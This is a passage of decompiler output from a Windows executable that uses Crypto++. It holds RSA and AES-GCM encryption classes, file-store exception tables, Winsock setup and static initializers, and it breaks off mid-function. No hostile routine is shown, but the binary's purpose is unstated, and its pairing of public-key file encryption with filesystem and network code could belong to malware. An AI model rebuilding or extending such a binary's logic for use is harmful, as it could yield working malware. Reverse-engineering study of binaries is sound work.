void *CryptoPP::Grouper::`vftable' = &sub_428363; // weak
void *CryptoPP::AutoSeededRandomPool::`vftable' = &sub_407680; // weak
void *CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable' = &sub_428323; // weak
void *CryptoPP::PK_EncryptorFilter::`vftable' = &sub_407110; // weak
void *CryptoPP::Base64Encoder::`vftable' = &sub_407110; // weak
const _ThrowInfo _TI4_AVBERDecodeErr_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA4_AVBERDecodeErr_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVSelfTestFailure_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA3_AVSelfTestFailure_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AVInvalidKeyLength_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA4_AVInvalidKeyLength_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__ =
{
  0u,
  &sub_432C30,
  NULL,
  &_CTA4_AUNoChannelSupport_BufferedTransformation_CryptoPP__
}; // idb
const _ThrowInfo _TI4_AVInvalidCiphertext_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA4_AVInvalidCiphertext_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVRandomNumberNotFound_Integer_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA3_AVRandomNumberNotFound_Integer_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVDivideByZero_Integer_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA3_AVDivideByZero_Integer_CryptoPP__ }; // idb
const _ThrowInfo _TI2_AVException_CryptoPP__ = { 0u, &sub_4050D0, NULL, &_CTA2_AVException_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__ =
{
  0u,
  &sub_432C30,
  NULL,
  &_CTA4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__
}; // idb
const _ThrowInfo _TI3_AVInvalidDataFormat_CryptoPP__ = { 0u, &sub_405310, NULL, &_CTA3_AVInvalidDataFormat_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AUInvalidChannelName_BufferedTransformation_CryptoPP__ =
{
  0u,
  &sub_432C30,
  NULL,
  &_CTA4_AUInvalidChannelName_BufferedTransformation_CryptoPP__
}; // idb
__TI_flags _TI4_AVOpenErr_FileStore_CryptoPP__ = 0; // weak
const _ThrowInfo _TI4_AVReadErr_FileStore_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA4_AVReadErr_FileStore_CryptoPP__ }; // idb
__TI_flags _TI4_AVOpenErr_FileSink_CryptoPP__ = 0; // weak
const _ThrowInfo _TI3_AVErr_FileSink_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA3_AVErr_FileSink_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AVWriteErr_FileSink_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA4_AVWriteErr_FileSink_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVOS_RNG_Err_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA3_AVOS_RNG_Err_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVBadState_AuthenticatedSymmetricCipher_CryptoPP__ =
{
  0u,
  &sub_432C30,
  NULL,
  &_CTA3_AVBadState_AuthenticatedSymmetricCipher_CryptoPP__
}; // idb
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &unknown_libname_6, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
const _ThrowInfo _TI4_AVHashInputTooLong_CryptoPP__ = { 0u, &sub_432C30, NULL, &_CTA4_AVHashInputTooLong_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVinvalid_argument_std__ = { 0u, &unknown_libname_6, NULL, &_CTA3_AVinvalid_argument_std__ }; // idb
const _ThrowInfo _TI3_AVlength_error_std__ = { 0u, &unknown_libname_6, NULL, &_CTA3_AVlength_error_std__ }; // idb
const _ThrowInfo _TI3_AVout_of_range_std__ = { 0u, &unknown_libname_6, NULL, &_CTA3_AVout_of_range_std__ }; // idb
const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, &unknown_libname_6, NULL, &_CTA3_AVbad_array_new_length_std__ }; // idb
const _ThrowInfo _TI2_AVimproper_lock_Concurrency__ = { 0u, &unknown_libname_6, NULL, &_CTA2_AVimproper_lock_Concurrency__ }; // idb
const _ThrowInfo _TI2_AVscheduler_resource_allocation_error_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVscheduler_resource_allocation_error_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVunsupported_os_Concurrency__ = { 0u, &unknown_libname_6, NULL, &_CTA2_AVunsupported_os_Concurrency__ }; // idb
__TI_flags _TI2_AVinvalid_operation_Concurrency__ = 0; // weak
const _ThrowInfo _TI2_AVimproper_scheduler_reference_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVimproper_scheduler_reference_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVimproper_scheduler_attach_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVimproper_scheduler_attach_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVmissing_wait_Concurrency__ = { 0u, &unknown_libname_6, NULL, &_CTA2_AVmissing_wait_Concurrency__ }; // idb
const _ThrowInfo _TI2_AV_Interruption_exception_details_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AV_Interruption_exception_details_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_key_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVinvalid_scheduler_policy_key_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_value_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVinvalid_scheduler_policy_value_Concurrency__
}; // idb
__TI_flags _TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__ = 0; // weak
const _ThrowInfo _TI2_AVcontext_unblock_unbalanced_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVcontext_unblock_unbalanced_Concurrency__
}; // idb
__TI_flags _TI2_AVcontext_self_unblock_Concurrency__ = 0; // weak
const _ThrowInfo _TI2_AVinvalid_oversubscribe_operation_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVinvalid_oversubscribe_operation_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVnested_scheduler_missing_detach_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA2_AVnested_scheduler_missing_detach_Concurrency__
}; // idb
const _ThrowInfo _TI3_AVscheduler_worker_creation_error_Concurrency__ =
{
  0u,
  &unknown_libname_6,
  NULL,
  &_CTA3_AVscheduler_worker_creation_error_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVbad_cast_std__ = { 0u, &sub_4019A0, NULL, &_CTA2_AVbad_cast_std__ }; // idb
const _ThrowInfo _TI5_AVfailure_ios_base_std__ = { 0u, &sub_4038B0, NULL, &_CTA5_AVfailure_ios_base_std__ }; // idb
const _ThrowInfo _TI3_AVNotImplemented_CryptoPP__ = { 0u, &sub_405310, NULL, &_CTA3_AVNotImplemented_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVInvalidArgument_CryptoPP__ = { 0u, &sub_405310, NULL, &_CTA3_AVInvalidArgument_CryptoPP__ }; // idb
const _ThrowInfo _TI5_AVfilesystem_error_filesystem_std__ = { 0u, &sub_404790, NULL, &_CTA5_AVfilesystem_error_filesystem_std__ }; // idb
const _ThrowInfo _TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__ = { 0u, &sub_405AE0, NULL, &_CTA4_AVValueTypeMismatch_NameValuePairs_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AVInvalidMaterial_CryptoMaterial_CryptoPP__ = { 0u, &sub_405AE0, NULL, &_CTA4_AVInvalidMaterial_CryptoMaterial_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AVsystem_error_std__ = { 0u, &sub_403120, NULL, &_CTA4_AVsystem_error_std__ }; // idb
const _ThrowInfo _TI3_AVCannotFlush_CryptoPP__ = { 0u, &sub_405310, NULL, &_CTA3_AVCannotFlush_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__ =
{
  0u,
  &sub_405310,
  NULL,
  &_CTA3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__
}; // idb
const _ThrowInfo _TI2_AVruntime_error_std__ = { 0u, &sub_4019A0, NULL, &_CTA2_AVruntime_error_std__ }; // idb
const _ThrowInfo _TI4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__ =
{
  0u,
  &sub_405AE0,
  NULL,
  &_CTA4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__
}; // idb
const _ThrowInfo _TI4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__ =
{
  0u,
  &sub_405AE0,
  NULL,
  &_CTA4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__
}; // idb
int dword_4E8000 = 0; // weak
int dword_4E8010 = 0; // weak
int dword_4E8014 = 15; // weak
void ***off_4E8018[3] = { &off_4E801C, &off_4B91C0, &off_4B92AC }; // weak
void **off_4E801C[2] = { &off_4B91C0, &off_4B92AC }; // weak
void **off_4E8020 = &off_4B92AC; // weak
int (__stdcall *off_4E802C)(_DWORD, _DWORD) = &sub_43CE60; // weak
int (__stdcall *off_4E8030)(int, int) = &sub_43CED0; // weak
int dword_4E8034 = 8; // weak
void *off_4E8038 = &unk_4EF6F0; // weak
int dword_4E8040 = 1073741823; // weak
int dword_4E8044 = 0; // weak
void *dword_4E8048 = NULL; // idb
int dword_4E8050 = 1073741823; // weak
int dword_4E8054 = 1; // weak
void *dword_4E8058 = NULL; // idb
void **off_4E805C = &CryptoPP::EC2NPoint::`vftable'; // weak
_DWORD dword_4E8060 = 0; // weak
int dword_4E8064 = 0; // weak
int dword_4E8068 = 0; // weak
void *dword_4E806C = NULL; // idb
_DWORD dword_4E8070 = 0; // weak
int dword_4E8074 = 0; // weak
int dword_4E8078 = 0; // weak
void *dword_4E807C = NULL; // idb
char byte_4E8080 = '\0'; // weak
void **off_4E8084 = &CryptoPP::ECPPoint::`vftable'; // weak
_DWORD dword_4E8088[6] = { 0, 0, 0, 0, 0, 0 }; // weak
_DWORD dword_4E80A0[6] = { 0, 0, 0, 0, 0, 0 }; // weak
char byte_4E80B8 = '\0'; // weak
int dword_4E80BC = 32; // weak
void **off_4E80C0 = &std::streambuf::`vftable'; // weak
int dword_4E80C4 = 0; // weak
int dword_4E80C8 = 0; // weak
int dword_4E80CC = 0; // weak
int dword_4E80D0 = 0; // weak
int dword_4E80D4 = 0; // weak
int dword_4E80D8 = 0; // weak
int dword_4E80DC = 0; // weak
int dword_4E80E0 = 0; // weak
int dword_4E80E4 = 0; // weak
int dword_4E80E8 = 0; // weak
int dword_4E80EC = 0; // weak
int dword_4E80F0 = 0; // weak
int dword_4E80F4 = 0; // weak
signed __int32 dword_4E80F8[23] =
{
  -1,
  1,
  2037411651,
  1751607666,
  1663574132,
  2036473897,
  1244549152,
  1817190446,
  1701279073,
  1814047858,
  1852138345,
  543450483,
  1142978914,
  1969974889,
  1918990189,
  1277176933,
  539911284,
  541871169,
  1212631378,
  1377850196,
  1380275013,
  776226134,
  0
}; // weak
uintptr_t __security_cookie = 3141592654u;
int dword_4E8180 = 1; // weak
int dword_4E8190 = 4000; // weak
int dword_4E81A0 = -1; // weak
int dword_4E81A4 = 1; // weak
_UNKNOWN unk_4E81A8; // weak
char *off_4E81D0[11] =
{
  "SchedulerKind",
  "MaxConcurrency",
  "MinConcurrency",
  "TargetOversubscriptionFactor",
  "LocalContextCacheSize",
  "ContextStackSize",
  "ContextPriority",
  "SchedulingProtocol",
  "DynamicProgressFeedback",
  "WinRTInitialization",
  "MaxPolicyElementKey"
}; // weak
void *off_4E81FC = &unk_4C0F5C; // weak
wchar_t *off_4E83D8 = L"         (((((                  H"; // weak
int dword_4E85A0 = -2; // weak
void *off_4E8B58 = &unk_4E8938; // idb
const unsigned __int8 *unsigned char const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
int dword_4E90D4 = 0; // weak
unsigned __int8 unsigned char `RTTI Type Descriptor' = 88u; // weak
int dword_4E9194 = 0; // weak
void **std::string `RTTI Type Descriptor' = &type_info::`vftable'; // weak
_UNKNOWN CryptoPP::Integer `RTTI Type Descriptor'; // weak
int dword_4E9290 = 0; // weak
_UNKNOWN enum CryptoPP::Integer::RandomNumberType `RTTI Type Descriptor'; // weak
int dword_4E98E8 = 0; // weak
const struct CryptoPP::PrimeSelector *CryptoPP::PrimeSelector const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
int dword_4E991C = 0; // weak
struct CryptoPP::InvertibleRSAFunction *CryptoPP::InvertibleRSAFunction * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct CryptoPP::RSAFunction *CryptoPP::RSAFunction * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
_UNKNOWN CryptoPP::ByteArrayParameter `RTTI Type Descriptor'; // weak
_UNKNOWN enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme `RTTI Type Descriptor'; // weak
int dword_4EAA14 = 0; // weak
void **std::istream * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
void **std::ostream * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
_UNKNOWN Concurrency::details::ExecutionResource `RTTI Type Descriptor'; // weak
_UNKNOWN Concurrency::IExecutionResource `RTTI Type Descriptor'; // weak
_UNKNOWN CryptoPP::AuthenticatedSymmetricCipher `RTTI Type Descriptor'; // weak
void **std::string * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
_UNKNOWN CryptoPP::RSAFunction `RTTI Type Descriptor'; // weak
int dword_4ECFEC = 0; // weak
_UNKNOWN CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor'; // weak
int dword_4ED2C4 = 0; // weak
const char *char const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
int dword_4ED4EC = 0; // weak
bool bool `RTTI Type Descriptor' = true; // weak
int dword_4ED868 = 0; // weak
_UNKNOWN CryptoPP::StreamTransformation `RTTI Type Descriptor'; // weak
const int *int const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
int dword_4EE00C = 0; // weak
const wchar_t *wchar_t const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
int dword_4EE1C8 = 0; // weak
int int `RTTI Type Descriptor' = 4982616; // weak
int dword_4EE1D8 = 0; // weak
_UNKNOWN CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor'; // weak
int dword_4EE7C4 = 0; // weak
int dword_4EED80 = 0; // weak
char byte_4EED84 = '\0'; // weak
int dword_4EED88 = 0; // weak
int dword_4EED8C = 0; // weak
int dword_4EED90 = 0; // weak
char byte_4EED94 = '\0'; // weak
int dword_4EED98 = 0; // weak
char byte_4EED9C = '\0'; // weak
int dword_4EEDA0 = 0; // weak
int dword_4EEDA4 = 0; // weak
int dword_4EEDA8 = 0; // weak
int dword_4EEDAC = 0; // weak
int dword_4EEDB0 = 0; // weak
int dword_4EEDB4 = 0; // weak
int dword_4EEDB8 = 0; // weak
int dword_4EEDC0 = 0; // weak
int dword_4EEDD0 = 0; // weak
int dword_4EEDD4 = 0; // weak
int dword_4EEDD8[4] = { 0, 0, 0, 0 }; // weak
int dword_4EEDE8 = 0; // weak
int dword_4EEDEC = 0; // weak
int dword_4EEDF0 = 0; // weak
int dword_4EEDF4 = 0; // weak
int dword_4EEDF8 = 0; // weak
char byte_4EEDFC = '\0'; // weak
int dword_4EEE04; // weak
int dword_4EEE0C; // weak
int dword_4EEE10; // weak
void *dword_4EEE14; // idb
int dword_4EEE18; // weak
int dword_4EEE1C; // weak
int dword_4EEE24; // weak
int dword_4EEE28; // weak
void *dword_4EEE2C; // idb
int dword_4EEE30; // weak
int dword_4EEE34; // weak
int dword_4EEE3C; // weak
int dword_4EEE40; // weak
void *dword_4EEE44; // idb
int dword_4EEE48; // weak
int dword_4EEE4C[]; // weak
int dword_4EEE50; // weak
int dword_4EEE54; // weak
int dword_4EEE5C; // weak
int dword_4EEE6C; // weak
int (__cdecl *dword_4EEE70)(_DWORD, _DWORD, _DWORD); // weak
int dword_4EEE74; // weak
int dword_4EEE78; // weak
int dword_4EEE80; // weak
int dword_4EEE90; // weak
int dword_4EEE94[]; // weak
int dword_4EEE98; // weak
int dword_4EEE9C; // weak
int dword_4EEEA4; // weak
int dword_4EEEB4; // weak
int dword_4EEEB8[]; // weak
int dword_4EEEBC; // weak
int dword_4EEEC0; // weak
int dword_4EEEC8; // weak
int dword_4EEED8; // weak
int dword_4EEEDC; // weak
int dword_4EEEE0; // weak
int dword_4EEEE4; // weak
int dword_4EEEE8; // weak
int dword_4EEEF0[]; // weak
int dword_4EEEF4[511]; // weak
int dword_4EF700[]; // weak
int dword_4EF704[511]; // weak
char byte_4EFF00; // weak
char byte_4EFF01; // weak
__int16 word_4EFF08[]; // weak
__int16 word_4EFF0A; // weak
char byte_4F0108; // weak
int dword_4F0110; // weak
int dword_4F0114; // weak
int dword_4F0118; // weak
int dword_4F011C; // weak
int dword_4F0120; // weak
char byte_4F0124; // weak
char byte_4F0125; // weak
char byte_4F0126; // weak
char byte_4F0127; // weak
char byte_4F0128; // weak
char byte_4F0129; // weak
char byte_4F012A; // weak
char byte_4F012B; // weak
char byte_4F012C; // weak
char byte_4F012D; // weak
char byte_4F012E; // weak
char byte_4F012F; // weak
char byte_4F0130; // weak
char byte_4F0131; // weak
char byte_4F0132; // weak
char byte_4F0133; // weak
char byte_4F0134; // weak
char byte_4F0135; // weak
char byte_4F0136; // weak
__int64 qword_4F0138; // weak
int dword_4F0140; // weak
__int64 qword_4F0148; // weak
int dword_4F0150; // weak
int dword_4F0154; // weak
int dword_4F0158; // weak
int dword_4F0160[18]; // weak
int dword_4F01A8; // weak
_UNKNOWN unk_4F01C0; // weak
_UNKNOWN unk_4F01C8; // weak
_UNKNOWN unk_4F0228; // weak
_UNKNOWN unk_4F0288; // weak
_UNKNOWN unk_4F0289; // weak
char byte_4F0290[80]; // weak
int dword_4F02E0; // weak
int dword_4F0338; // weak
int dword_4F0344; // weak
int dword_4F034C; // weak
int dword_4F0350; // weak
_DWORD dword_4F0354; // weak
_UNKNOWN unk_4F035C; // weak
int dword_4F0364; // weak
_UNKNOWN unk_4F0370; // weak
_UNKNOWN unk_4F0371; // weak
int dword_4F0378[5]; // weak
int dword_4F038C; // weak
int dword_4F0398; // weak
int dword_4F039C; // weak
int dword_4F03B0; // weak
__int16 word_4F03B8; // weak
int dword_4F03C8; // weak
_UNKNOWN unk_4F0420; // weak
_UNKNOWN unk_4F0421; // weak
int dword_4F0428[5]; // weak
int dword_4F043C; // weak
int dword_4F0464; // weak
int dword_4F0478[23]; // weak
int dword_4F0508; // weak
int dword_4F0714; // weak
int dword_4F072C; // weak
int dword_4F0750; // weak
int dword_4F0754; // weak
int dword_4F0758; // weak
int dword_4F075C; // weak
int dword_4F0760; // weak
int dword_4F0764; // weak
int dword_4F0768; // weak
int dword_4F076C; // weak
_UNKNOWN unk_4F0770; // weak
_UNKNOWN unk_4F0771; // weak
union _SLIST_HEADER stru_4F0838; // idb
int TlsIndex; // weak
int dword_4F0B8C; // weak
_UNKNOWN unk_4F0B90; // weak
int dword_4F0B98; // weak
int dword_4F0B9C; // weak
int dword_4F0BA4; // weak
int dword_4F0BA8; // weak
int dword_4F0BAC; // weak
int dword_4F0BB0; // weak
int dword_4F0BB8; // weak
HMODULE hLibModule; // idb
int dword_4F0BC0; // weak
int dword_4F0BD0; // weak
ULONG_PTR ProcessAffinityMask; // idb
ULONG_PTR SystemAffinityMask; // idb
int dword_4F0BDC; // weak
int dword_4F0BE0; // weak
int dword_4F0BE4; // weak
char byte_4F0BE8; // weak
int dword_4F0BEC; // weak
int dword_4F0BF0; // weak
int dword_4F0BF4; // weak
int dword_4F0BF8; // weak
void *Block; // idb
int dword_4F0C00; // weak
int dword_4F0C04; // weak
int dword_4F0C08; // weak
int dword_4F0C10; // weak
int dword_4F0C14; // weak
int dword_4F0C18; // weak
int dword_4F0C1C; // weak
int dword_4F0C20; // weak
int dword_4F0C24; // weak
union _SLIST_HEADER ListHead; // idb
int dword_4F0C30; // weak
int dword_4F0C34; // weak
int dword_4F0C38; // weak
int dword_4F0C3C; // weak
int dword_4F0C40; // weak
__int32 dword_4F0C44; // weak
int dword_4F0C48; // weak
int dword_4F0C50; // weak
int dword_4F0C54; // weak
int dword_4F0C58; // weak
char byte_4F0C5C; // weak
int dword_4F0C60; // weak
int dword_4F0C64; // weak
int dword_4F0C68; // weak
DWORD dwTlsIndex; // idb
signed __int32 dword_4F0C70[19]; // weak
int dword_4F0D68; // weak
int dword_4F0FE0; // weak
int dword_4F0FE4; // weak
int dword_4F0FE8; // weak
int dword_4F0FEC; // weak
_onexit_table_t stru_4F0FF0; // idb
int dword_4F1008; // weak
int dword_4F1010; // weak
void *dword_4F1014; // idb
int dword_4F1028; // weak
int dword_4F102C; // weak
int dword_4F1030; // weak
LPCRITICAL_SECTION lpCriticalSection[128]; // weak
int dword_4F1320; // weak
int dword_4F1330; // weak
int dword_4F1334; // weak
HANDLE hHeap; // idb
_UNKNOWN unk_4F1430; // weak
_UNKNOWN unk_4F1438; // weak
__int64 qword_4F1510; // weak
int dword_4F1518; // weak
int dword_4F151C; // weak
int dword_4F1520; // weak
int dword_4F1524; // weak
int dword_4F1528; // weak
int dword_4F152C; // weak
_UNKNOWN unk_4F1530; // weak
_UNKNOWN unk_4F1534; // weak
_UNKNOWN unk_4F1538; // weak
int dword_4F153C; // weak
int dword_4F1540; // weak
int dword_4F1544; // weak
int dword_4F1548; // weak
_UNKNOWN unk_4F154C; // weak
_UNKNOWN unk_4F1554; // weak
int dword_4F155C; // weak
int dword_4F1560; // weak
_UNKNOWN unk_4F1568; // weak
_UNKNOWN unk_4F1570; // weak
_UNKNOWN unk_4F15A0; // weak
int dword_4F15A8; // weak
int dword_4F15AC; // weak
int dword_4F15B0; // weak
_UNKNOWN unk_4F15B4; // weak
_UNKNOWN unk_4F15B8; // weak
int dword_4F15C0; // weak


//----- (00401000) --------------------------------------------------------
u_long sub_401000()
{
  u_long result; // eax

  result = htonl(0);
  dword_4EED90 = result;
  byte_4EED94 = 1;
  return result;
}
// 4EED90: using guessed type int dword_4EED90;
// 4EED94: using guessed type char byte_4EED94;

//----- (00401020) --------------------------------------------------------
u_long sub_401020()
{
  u_long result; // eax

  result = htonl(0xFFFFFFFF);
  dword_4EED80 = result;
  byte_4EED84 = 1;
  return result;
}
// 4EED80: using guessed type int dword_4EED80;
// 4EED84: using guessed type char byte_4EED84;

//----- (00401040) --------------------------------------------------------
u_long sub_401040()
{
  u_long result; // eax

  result = htonl(0x7F000001u);
  dword_4EED98 = result;
  byte_4EED9C = 1;
  return result;
}
// 4EED98: using guessed type int dword_4EED98;
// 4EED9C: using guessed type char byte_4EED9C;

//----- (00401060) --------------------------------------------------------
int sub_401060()
{
  struct WSAData WSAData; // [esp+0h] [ebp-194h] BYREF

  WSAStartup(0x202u, &WSAData);
  return atexit((void (__cdecl *)())WSACleanup);
}

//----- (004010A0) --------------------------------------------------------
int sub_4010A0()
{
  sub_419B80((int)&dword_4EEDD8, &unk_4B91C8);
  return atexit(sub_4B7670);
}
// 4EEDD8: using guessed type int dword_4EEDD8;

//----- (004010C0) --------------------------------------------------------
int sub_4010C0()
{
  sub_419B80((int)&dword_4EEDC0, &unk_4CCC25);
  return atexit(sub_4B76D0);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004010E0) --------------------------------------------------------
int sub_4010E0()
{
  return atexit(sub_4B7740);
}

//----- (004010F0) --------------------------------------------------------
int sub_4010F0()
{
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  dword_4EEE1C = (int)&CryptoPP::Integer::`vftable';
  dword_4EEE24 = 0x3FFFFFFF;
  dword_4EEE28 = 2;
  dword_4EEE2C = (void *)sub_41E7A0(2u, 0);
  dword_4EEE30 = 0;
  *(_DWORD *)dword_4EEE2C = 1;
  *((_DWORD *)dword_4EEE2C + 1) = 0;
  return atexit(sub_4B7760);
}
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;
// 4EEE1C: using guessed type int dword_4EEE1C;
// 4EEE24: using guessed type int dword_4EEE24;
// 4EEE28: using guessed type int dword_4EEE28;
// 4EEE30: using guessed type int dword_4EEE30;

//----- (00401160) --------------------------------------------------------
int sub_401160()
{
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  dword_4EEE34 = (int)&CryptoPP::Integer::`vftable';
  dword_4EEE3C = 0x3FFFFFFF;
  dword_4EEE40 = 2;
  dword_4EEE44 = (void *)sub_41E7A0(2u, 0);
  dword_4EEE48 = 0;
  *(_DWORD *)dword_4EEE44 = 2;
  *((_DWORD *)dword_4EEE44 + 1) = 0;
  return atexit(sub_4B77F0);
}
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;
// 4EEE34: using guessed type int dword_4EEE34;
// 4EEE3C: using guessed type int dword_4EEE3C;
// 4EEE40: using guessed type int dword_4EEE40;
// 4EEE48: using guessed type int dword_4EEE48;

//----- (004011D0) --------------------------------------------------------
int sub_4011D0()
{
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  dword_4EEE04 = (int)&CryptoPP::Integer::`vftable';
  dword_4EEE0C = 0x3FFFFFFF;
  dword_4EEE10 = 2;
  dword_4EEE14 = (void *)sub_41E7A0(2u, 0);
  dword_4EEE18 = 0;
  *(_DWORD *)dword_4EEE14 = 0;
  *((_DWORD *)dword_4EEE14 + 1) = 0;
  return atexit(sub_4B7880);
}
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;
// 4EEE04: using guessed type int dword_4EEE04;
// 4EEE0C: using guessed type int dword_4EEE0C;
// 4EEE10: using guessed type int dword_4EEE10;
// 4EEE18: using guessed type int dword_4EEE18;

//----- (00401250) --------------------------------------------------------
int sub_401250()
{
  _DWORD *v0; // eax

  v0 = sub_43CB70(1u, 0);
  dword_4E8058 = v0;
  if ( dword_4E8054 )
  {
    *v0 = 1;
    if ( dword_4E8054 != 1 )
      memset((char *)dword_4E8058 + 4, 0, 4 * (dword_4E8054 - 1));
  }
  return atexit(sub_4B7970);
}
// 4E8054: using guessed type int dword_4E8054;

//----- (004012A0) --------------------------------------------------------
int sub_4012A0()
{
  dword_4E8048 = sub_43CB70(0, 0);
  return atexit(sub_4B79E0);
}

//----- (004012C0) --------------------------------------------------------
int sub_4012C0()
{
  sub_462950(&dword_4E8060);
  sub_462950(&dword_4E8070);
  byte_4E8080 = 1;
  return atexit(sub_4B7A50);
}
// 4E8060: using guessed type _DWORD dword_4E8060;
// 4E8070: using guessed type _DWORD dword_4E8070;
// 4E8080: using guessed type char byte_4E8080;

//----- (00401320) --------------------------------------------------------
int sub_401320()
{
  sub_43D6C0(dword_4E8088);
  sub_43D6C0(dword_4E80A0);
  byte_4E80B8 = 1;
  return atexit(sub_4B7AF0);
}
// 4E8088: using guessed type _DWORD dword_4E8088[6];
// 4E80A0: using guessed type _DWORD dword_4E80A0[6];
// 4E80B8: using guessed type char byte_4E80B8;

//----- (00401385) --------------------------------------------------------
int sub_401385()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4F01C0);
  return atexit(sub_4B7C12);
}
// 469A89: using guessed type _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this);

//----- (0040139B) --------------------------------------------------------
int sub_40139B()
{
  sub_41FCA0(byte_4F0290, (int)&dword_4F02E0, 0, 1);
  return atexit(sub_4B7C1C);
}
// 4F02E0: using guessed type int dword_4F02E0;

//----- (004013F4) --------------------------------------------------------
void *sub_4013F4()
{
  void *v0; // edx

  v0 = &unk_4F0290;
  dword_4F0754 = (int)&unk_4F0290;
  if ( dword_4F0750 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4F0750 + 4) + dword_4F0750 + 60) = &unk_4F0290;
    v0 = (void *)dword_4F0754;
  }
  if ( dword_4F0758 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4F0758 + 4) + dword_4F0758 + 60) = v0;
    v0 = (void *)dword_4F0754;
  }
  if ( dword_4F075C )
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4F075C + 4) + dword_4F075C + 60) = v0;
  return &unk_4F0289;
}
// 4F0750: using guessed type int dword_4F0750;
// 4F0754: using guessed type int dword_4F0754;
// 4F0758: using guessed type int dword_4F0758;
// 4F075C: using guessed type int dword_4F075C;

//----- (004013FE) --------------------------------------------------------
int sub_4013FE()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4F0288);
  return atexit(sub_4B7C30);
}
// 469A89: using guessed type _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this);

//----- (00401414) --------------------------------------------------------
int sub_401414()
{
